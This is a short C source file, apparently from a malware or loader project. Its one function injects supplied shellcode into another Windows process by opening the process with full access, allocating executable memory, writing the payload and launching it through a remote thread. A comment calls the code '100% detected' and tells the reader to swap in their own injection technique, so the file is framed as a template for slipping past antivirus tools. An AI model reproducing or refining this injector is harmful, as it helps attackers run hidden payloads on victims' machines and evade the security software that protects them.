
#include <windows.h>
#include <tlhelp32.h>


//this is simple and 100% detected, replace code and add your injection technique 
int Inject(unsigned char *ShellCode,int size,int ProcessID)

{

    HANDLE hRemoteProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessID);

	// allocate space for module in target process
	LPVOID lpRemoteAllocation = VirtualAllocEx(hRemoteProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	size_t szBytesWritten;
	WriteProcessMemory(hRemoteProcess, lpRemoteAllocation, ShellCode, size, &szBytesWritten);

	HANDLE hRemoteThread = CreateRemoteThread(hRemoteProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpRemoteAllocation, NULL, 0, NULL);

	CloseHandle(hRemoteProcess);

	return 0;

}